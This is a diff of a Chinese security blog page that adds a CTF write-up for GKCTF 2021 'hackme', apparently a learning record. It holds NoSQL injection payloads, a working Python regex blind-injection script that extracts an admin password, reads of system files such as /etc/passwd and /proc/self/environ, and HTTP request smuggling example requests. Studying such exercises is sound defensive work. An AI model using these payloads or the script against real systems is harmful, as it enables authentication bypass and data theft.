@@ -45,7 +45,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
 <meta property="article:published_time" content="2024-02-23T08:14:36.000Z">
-<meta property="article:modified_time" content="2024-03-08T12:53:40.964Z">
+<meta property="article:modified_time" content="2024-03-21T09:21:48.486Z">
 <meta property="article:author" content="Jijoy">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -1628,7 +1628,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1709902433593),
+    lastupdate: new Date(1711460695692),
     sidebar: {
       for_page: ["blogger","category","tagcloud","webinfo","lastupdate"],
       for_post: ["toc"],
@@ -2514,6 +2514,173 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>成功传输后就可以对从redis进行命令执行，这个就通过ssrf-redis.py生成执行命令，对从redis进行控制（这里由于get传参，所以在进行一次url加密）</p>
 <p>（感觉除了网页显示，也可以通过检测主redis端口也可以）</p>
 <p><img src="/../image/166.png" class="lazyload" data-srcset="/../image/166.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="166"></p>
+<h2 id="GKCTF-2021-hackme"><a href="#GKCTF-2021-hackme" class="headerlink" title="[GKCTF 2021]hackme"></a>[GKCTF 2021]hackme</h2><p>进入网页为登录页面，可以看到提示是使用nosql</p>
+<p><img src="/../image/167.png" class="lazyload" data-srcset="/../image/167.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="167"></p>
+<p>这里就先了解一下nosql</p>
+<h3 id="NoSQl"><a href="#NoSQl" class="headerlink" title="NoSQl"></a>NoSQl</h3><p>NoSQL 即 Not Only SQL，意即 “不仅仅是SQL”，支持在关系数据库中发现的传统结构之外存储和查询数据</p>
+<p>NoSQL注入主要有两种注入方式：</p>
+<p>第一种是按照语言的分类，可以分为：PHP 数组注入，JavaScript 注入和 Mongo Shell 拼接注入等等</p>
+<p>第二种是按照攻击机制分类，可以分为：重言式注入，联合查询注入，JavaScript 注入、盲注等，这种分类方式很像传统 SQL 注入的分类方式。</p>
+<blockquote>
+<p><strong>重言式注入</strong></p>
+<p>又称为永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。</p>
+<p><strong>联合查询注入</strong></p>
+<p>联合查询是一种众所周知的 SQL 注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。</p>
+<p><strong>JavaScript 注入</strong></p>
+<p>MongoDB Server 支持 JavaScript，这使得在数据引擎进行复杂事务和查询成为可能，但是传递不干净的用户输入到这些查询中可以注入任意的 JavaScript 代码，导致非法的数据获取或篡改。</p>
+<p><strong>盲注</strong></p>
+<p>当页面没有回显时，那么我们可以通过 <code>$regex</code> 正则表达式来达到和传统 SQL 注入中 <code>substr()</code> 函数相同的功能，而且 NoSQL 用到的基本上都是布尔盲注。</p>
+</blockquote>
+<p>这里以MongoDB进行简单解释这几种注入方式（暂时先不用JavaScript)</p>
+<p><code>数据库（Database）</code></p>
+<p>一个 MongoDB 中可以建立多个数据库</p>
+<p><code>集合（Collection）</code></p>
+<p>集合就是 MongoDB 文档组</p>
+<p><code>文档（Document）</code></p>
+<p>文档是一组键值（key-value）对</p>
+<p>需要介绍一下一些简答的语法</p>
+<p>使用 <code>find()</code> 方法来查询文档</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.collection.find(query, projection)</span><br></pre></td></tr></table></figure>
+
+<p>query：可选，使用查询操作符指定查询条件，相当于 sql select 语句中的 where 子句</p>
+<p><code>find()</code> 方法可以传入多个键值对，每个键值对以逗号隔开</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;key1: value1, key2:value2&#125;</span><br></pre></td></tr></table></figure>
+
+<p>OR 条件语句使用了关键字 <code>$or</code> 来表示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$or: [&#123;key1: value1&#125;, &#123;key2:value2&#125;]&#125;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>等于</th>
+<th>{<key>:<value>}</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>小于</td>
+<td>{<key>:{$lt:<value>}}</td>
+</tr>
+<tr>
+<td>小于或等于</td>
+<td>{<key>:{$lte:<value>}}</td>
+</tr>
+<tr>
+<td>大于</td>
+<td><code>&#123;&lt;key&gt;:&#123;$gt:&lt;value&gt;&#125;&#125;</code></td>
+</tr>
+<tr>
+<td>大于或等于</td>
+<td><code>&#123;&lt;key&gt;:&#123;$gte:&lt;value&gt;&#125;&#125;</code></td>
+</tr>
+<tr>
+<td>不等于</td>
+<td><code>&#123;&lt;key&gt;:&#123;$ne:&lt;value&gt;&#125;&#125;</code></td>
+</tr>
+</tbody></table>
+<h4 id="重言式注入"><a href="#重言式注入" class="headerlink" title="重言式注入"></a><strong>重言式注入</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">array(</span><br><span class="line">    &#x27;username&#x27; =&gt; $username,</span><br><span class="line">    &#x27;password&#x27; =&gt; $password</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>查询命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.users.find(&#123;&#x27;username&#x27;:$username, &#x27;password&#x27;:$password&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>可以通过 <code>$ne</code> 关键字构造一个永真的条件就可以完成 NoSQL 注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&#123;&quot;$ne&quot;:1&#125;,&quot;password&quot;: &#123;&quot;$ne&quot;:1&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行查询语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.users.find(&#123;&#x27;username&#x27;:&#123;&quot;$ne&quot;:1&#125;，&#x27;password&#x27;:&#123;&quot;$ne&quot;:1&#125;&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>即在users中寻找username 和 password 都不等于 1的文档</p>
+<h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a><strong>联合查询注入</strong></h4><p>联合查询与sql注入相似</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&#x27;, $or: [ &#123;&#125;, &#123;&#x27;a&#x27;: &#x27;a&amp;password=&#x27; &#125;], $comment: &#x27;123456</span><br></pre></td></tr></table></figure>
+
+<p>执行查询命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; username: &#x27;admin&#x27;, $or: [ &#123;&#125;, &#123;&#x27;a&#x27;:&#x27;a&#x27;, password: &#x27;&#x27; &#125;], $comment: &#x27;123456&#x27;&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a><strong>盲注</strong></h4><p>盲注基本与sql注入一致，通过正则匹配进行查询</p>
+<p>这道题先尝试用重言式注入进行登录</p>
+<p><img src="/../image/169.png" class="lazyload" data-srcset="/../image/169.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="169"></p>
+<p>发现存在过滤，看到提示</p>
+<p><img src="/../image/170.png" class="lazyload" data-srcset="/../image/170.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="170"></p>
+<p>这里进行unicode加密</p>
+<p><img src="/../image/168.png" class="lazyload" data-srcset="/../image/168.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="168"></p>
+<p>这里应该密码错误，所以进行盲注，爆出密码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">burp0_url = <span class="string">&quot;http://node5.buuoj.cn:28299/login.php&quot;</span></span><br><span class="line">password=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>(i) <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;$&#x27;</span>]://这里需要避免特殊字符对正则表达式的影响</span><br><span class="line">            burp0_json=<span class="string">&quot;&quot;&quot;&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&#123;&quot;\\u0024\\u0072\\u0065\\u0067\\u0065\\u0078&quot;:&quot;^%s&quot;&#125;&#125;&quot;&quot;&quot;</span>%(password+<span class="built_in">chr</span>(i))</span><br><span class="line">            <span class="comment"># print(burp0_json)</span></span><br><span class="line">            burp0_cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;1qf2s7fp09gvj10q7ktj40o8l9&quot;</span>&#125;</span><br><span class="line">            burp0_headers = &#123;<span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/javascript, */*; q=0.01&quot;</span>, <span class="string">&quot;X-Requested-With&quot;</span>: <span class="string">&quot;XMLHttpRequest&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json; charset=UTF-8&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://node5.buuoj.cn:26382&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://node5.buuoj.cn:26382/&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">            res=requests.post(url=burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_json)</span><br><span class="line">            <span class="comment"># print(res.text)</span></span><br><span class="line">            <span class="comment"># print(res.content.decode())</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;登录了，但没完全登录&quot;</span> <span class="keyword">in</span> res.content.decode():</span><br><span class="line">                password+=<span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="built_in">print</span>(password)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>可以得到密码<code>42276606202db06ad1f29ab6b4a1307f</code></p>
+<p>登录后发现是一个文件测试，尝试了一下可以进行文件读取</p>
+<p><img src="/../image/171.png" class="lazyload" data-srcset="/../image/171.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="171"></p>
+<p>查看&#x2F;flag，发现flag在内网</p>
+<p><img src="/../image/172.png" class="lazyload" data-srcset="/../image/172.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="172"></p>
+<p>就需要结合提示</p>
+<p><img src="/../image/173.png" class="lazyload" data-srcset="/../image/173.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="173"></p>
+<p>因为要用到server和配置文件，就先写一下一些基础知识</p>
+<p><strong>&#x2F;etc&#x2F;passwd</strong></p>
+<p>该文件储存了该Linux系统中所有用户的一些基本信息，只有root权限才可以修改。其具体格式为   用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell（以冒号作为分隔符）</p>
+<p><strong>&#x2F;proc&#x2F;self&#x2F;cmdline</strong></p>
+<p>该文件包含的内容为当前进程执行的命令行参数</p>
+<p><strong>&#x2F;proc&#x2F;self&#x2F;mem</strong></p>
+<p>&#x2F;proc&#x2F;self&#x2F;mem是当前进程的内存内容，通过修改该文件相当于直接修改当前进程的内存数据</p>
+<p><strong>&#x2F;proc&#x2F;self&#x2F;environ</strong></p>
+<p>&#x2F;proc&#x2F;self&#x2F;environ文件包含了当前进程的环境变量</p>
+<p><strong>&#x2F;proc&#x2F;self&#x2F;fd</strong></p>
+<p>这是一个目录，该目录下的文件包含着当前进程打开的文件的内容和路径</p>
+<p><strong>&#x2F;proc&#x2F;self&#x2F;exe</strong></p>
+<p>获取当前进程的可执行文件的路径</p>
+<p>查看进程环境变量，可以看到使用的式nginx</p>
+<p><img src="/../image/174.png" class="lazyload" data-srcset="/../image/174.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="174"></p>
+<p>配置文件存放目录：&#x2F;etc&#x2F;nginx<br>主配置文件：&#x2F;etc&#x2F;nginx&#x2F;conf&#x2F;nginx.conf 或 &#x2F;etc&#x2F;nginx&#x2F;nginx.conf<br>管理脚本：&#x2F;usr&#x2F;lib64&#x2F;systemd&#x2F;system&#x2F;nginx.service<br>模块：&#x2F;usr&#x2F;lisb64&#x2F;nginx&#x2F;modules<br>应用程序：&#x2F;usr&#x2F;sbin&#x2F;nginx<br>程序默认存放位置：&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html<br>日志默认存放位置：&#x2F;var&#x2F;log&#x2F;nginx</p>
+<p>访问&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf，可以看到有个weblogic服务</p>
+<p><img src="/../image/175.png" class="lazyload" data-srcset="/../image/175.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="175"></p>
+<p>这里就需要通过http请求走私来进行绕过（Ngnix &lt; 1.17.7 中error_page 存在请求走私的漏洞，此处Ngnix为1.17.6，这就可以走私到WebLogic Console登录页面）（这里好像都是利用本身存在的漏洞，做的时候一直都没成功走私，这里就简单记录一下知识点）</p>
+<p><img src="/../image/176.png" class="lazyload" data-srcset="/../image/176.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="176"></p>
+<h3 id="HTTP-请求走私"><a href="#HTTP-请求走私" class="headerlink" title="HTTP 请求走私"></a>HTTP 请求走私</h3><p>HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式的技术。使攻击者可以绕过安全控制，未经授权访问敏感数据并直接危害其他应用程序用户。</p>
+<p><img src="/../image/177.png" class="lazyload" data-srcset="/../image/177.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="177"></p>
+<p>这里引用一个图来进行简单解释，请求走私发生多是由于前端服务器和后端服务器对传入的数据理解不一致造成，其原因是由于http提供的两种不同请求结束方式，即 <code>Content-Length</code> 和 <code>Transfer-Encoding</code> 标头</p>
+<p>这也就造成其三种分类</p>
+<p><strong>CLTE</strong>：前端服务器使用 <code>Content-Length</code> 头，后端服务器使用 <code>Transfer-Encoding</code> 头</p>
+<p><strong>TECL</strong>：前端服务器使用 <code>Transfer-Encoding</code> 标头，后端服务器使用 <code>Content-Length</code> 标头。</p>
+<p><strong>TETE</strong>：前端和后端服务器都支持 <code>Transfer-Encoding</code> 标头，但是可以通过以某种方式来诱导其中一个服务器不处理它</p>
+<p>这也提供了五种攻击方式</p>
+<h4 id="CL不为0"><a href="#CL不为0" class="headerlink" title="CL不为0"></a>CL不为0</h4><p>所有不携带请求体的HTTP请求都有可能受此影响</p>
+<p>前端代理服务器允许GET请求携带请求体；后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的<code>Content-Length</code>头，不进行处理。这就有可能导致请求走私</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: test.com</span><br><span class="line">Content-Length: 44</span><br><span class="line"></span><br><span class="line">GET / secret HTTP/1.1</span><br><span class="line">Host: test.com</span><br></pre></td></tr></table></figure>
+
+<p>前端服务器收到该请求，读取<code>Content-Length</code>，判断这是一个完整的请求。<br>然后转发给后端服务器，后端服务器收到后，因为它不对<code>Content-Length</code>进行处理，由于<code>Pipeline</code>的存在，后端服务器就认为这是收到了两个请求</p>
+<p>第一个：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: test.com</span><br></pre></td></tr></table></figure>
+
+<p>第二个：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / secret HTTP/1.1</span><br><span class="line">Host: test.com</span><br></pre></td></tr></table></figure>
+
+<p>从而造成请求走私</p>
+<h4 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL"></a>CL-CL</h4><blockquote>
+<p>在RFC7230的第3.3.3节中的第四条中，规定当服务器收到的请求中包含两个<code>Content-Length</code>，而且两者的值不同时，需要返回400错误。</p>
+</blockquote>
+<p>中间代理服务器按照第一个<code>Content-Length</code>的值对请求进行处理，而后端源站服务器按照第二个<code>Content-Length</code>的值进行处理，当后端值小于代理器的值时，仍会残留部分在缓冲区，而当再次对服务器进行请求，就会对后一次请求造成影响</p>
+<h4 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h4><p>CL-TE，就是当收到存在两个请求头的请求包时，前端代理服务器只处理<code>Content-Length</code>请求头，而后端服务器会遵守<code>RFC2616</code>的规定，忽略掉<code>Content-Length</code>，处理<code>Transfer-Encoding</code>请求头</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">......</span><br><span class="line">Connection: keep-alive\r\n</span><br><span class="line">Content-Length: 6\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n //当读到0\r\n 、\r\n即换行结束</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure>
+
+<p>由于前端服务器处理<code>Content-Length</code>，所以这个请求对于它来说是一个完整的请求，请求体的长度为6，也就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure>
+
+<p>而后端服务器处理<code>Transfer-Encoding</code>，当它读取到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
+
+<p>就以为结束了，导致a残留在缓冲区，与CL-CL情况一致，对后一次请求造成影响</p>
+<h4 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h4><p>TE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理<code>Transfer-Encoding</code>请求头，后端服务器处理<code>Content-Length</code>请求头。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: test.com\r\n</span><br><span class="line">......</span><br><span class="line">Content-Length: 4\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">12\r\n</span><br><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
+
+<p>前端服务器处理<code>Transfer-Encoding</code>，当其读取到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
+
+<p>认为是读取完毕了<br>后端服务器处理<code>Content-Length</code>请求头，因为请求体的长度为<code>4</code>.也就是当它读取完</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12\r\n</span><br></pre></td></tr></table></figure>
+
+<p>就读取结束了</p>
+<p>从而造成后面形成另一个请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
+
+<p>从而造成请求走私</p>
+<h4 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h4><p>TE-TE，当收到存在两个请求头的请求包时，前后端服务器都处理<code>Transfer-Encoding</code>请求头，对发送的请求包中的<code>Transfer-Encoding</code>进行某种混淆操作(如某个字符改变大小写)，从而使其中一个服务器不处理<code>Transfer-Encoding</code>请求头，在某种意义上这还是<code>CL-TE</code>或者<code>TE-CL</code></p>
 
   </div>
   
@@ -2538,10 +2705,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2024-03-08T20:53:40+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2024-03-21T17:21:48+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Mar 8, 2024</p>
+    <p>更新于：Mar 21, 2024</p>
   </a>
 </div>
 
@@ -2617,6 +2784,13 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class="prev-next">
       
+        <a class='prev' href='/2024/03/26/nkctf/'>
+          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>nkctf</p>
+          <p class='content'>用过都说熟悉这道题一打开进去是一个登录界面，比赛的时候稍微尝试了一下弱密码，发现不行就先放弃了，赛后发现是一道反序列化的题目，才开始认真审计代码，这道题差不多复现出来了，所以就稍微记录一下。
+
+...</p>
+        </a>
+      
       
         <a class='next' href='/2024/01/02/awd/'>
           <p class='title'>awd<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
@@ -2678,7 +2852,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF%E6%BC%8F%E6%B4%9E"><span class="toc-text">SSRF漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%A2%E6%88%90%E6%88%90%E5%9B%A0"><span class="toc-text">形成成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A7%E7%94%9F%E6%BC%8F%E6%B4%9E%E5%87%BD%E6%95%B0"><span class="toc-text">产生漏洞函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E7%BD%91IP%E5%9C%B0%E5%9D%80"><span class="toc-text">内网IP地址</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-text">绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ip%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%8E%9F%E7%90%86"><span class="toc-text">ip地址转换原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E5%8D%8F%E8%AE%AE"><span class="toc-text">常见利用协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Gopher%E5%8D%8F%E8%AE%AE"><span class="toc-text">Gopher协议</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#De1CTF-2019-SSRF-Me"><span class="toc-text">[De1CTF 2019]SSRF Me</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe"><span class="toc-text">[网鼎杯 2020 玄武组]SSRFMe</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E7%9A%84%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6"><span class="toc-text">redis的主从复制</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF%E6%BC%8F%E6%B4%9E"><span class="toc-text">SSRF漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%A2%E6%88%90%E6%88%90%E5%9B%A0"><span class="toc-text">形成成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A7%E7%94%9F%E6%BC%8F%E6%B4%9E%E5%87%BD%E6%95%B0"><span class="toc-text">产生漏洞函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E7%BD%91IP%E5%9C%B0%E5%9D%80"><span class="toc-text">内网IP地址</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-text">绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ip%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%8E%9F%E7%90%86"><span class="toc-text">ip地址转换原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E5%8D%8F%E8%AE%AE"><span class="toc-text">常见利用协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Gopher%E5%8D%8F%E8%AE%AE"><span class="toc-text">Gopher协议</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#De1CTF-2019-SSRF-Me"><span class="toc-text">[De1CTF 